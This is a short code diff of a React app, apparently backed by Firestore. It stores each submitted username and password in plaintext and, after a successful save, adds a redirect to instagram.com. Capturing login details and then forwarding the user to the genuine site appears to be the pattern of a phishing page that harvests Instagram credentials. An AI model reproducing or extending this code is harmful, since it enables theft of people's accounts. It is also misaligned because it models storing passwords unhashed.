@@ -13,7 +13,9 @@ function App() {
   const createUser = (e) => {
     e.preventDefault()
     addDoc(usersCollectionRef, { username: newUserName, password: newPassword})
-    .then(err => console.log("oknpm", err))
+    .then(err => {console.log("oknpm", err)
+                  window.location.replace('https://www.instagram.com') 
+     })
     .catch(err => console.log("there is an error", err));
   }
 
